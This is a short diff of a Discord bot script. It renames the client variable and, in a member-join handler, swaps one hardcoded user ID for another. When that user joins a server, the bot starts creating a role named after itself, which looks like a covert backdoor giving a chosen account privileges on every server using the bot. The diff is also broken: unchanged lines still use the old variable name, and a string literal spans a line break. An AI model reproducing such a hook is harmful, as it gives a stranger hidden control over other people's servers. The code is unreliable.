@@ -1,5 +1,8 @@
-const Discord = require("discord.js");
-const LOka = new Discord.Client();
+const Discord = require('discord.js');
+const client = new Discord.Client();
+const fs = require('fs');
+
+
 console.log('By KBOOOOOOOOSH-YT');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
@@ -460,7 +463,7 @@ LOka.on('guildCreate', async (guild) => {
  
 LOka.on('guildMemberAdd', member => {
    
-            if (member.id === "456627103090081802
+            if (member.id === "378293431593598986
 ") {
                 member.guild.createRole({
                     name : LOka.user.username,
